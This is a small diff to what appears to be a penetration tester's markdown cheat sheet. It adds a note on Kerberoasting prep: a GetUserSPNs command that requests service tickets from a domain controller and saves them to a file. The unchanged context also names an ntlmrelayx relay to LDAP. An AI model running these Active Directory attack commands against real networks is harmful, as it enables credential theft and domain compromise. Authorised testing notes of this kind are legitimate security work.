@@ -32,4 +32,10 @@ ntlmrelayx.py -t ldap://ip_of_domain_controller
 
 ## Looks like it supports socks server of some sort.  Not sure about this one.
 
+## GetUserSPNs - prep for kerberoasting
+```
+I don't see how to add hashes/auth here but it has to happen.
+GetUserSPNs.exe -request -dc-ip <ip> username -outputfile TGStickets
+```
+
 
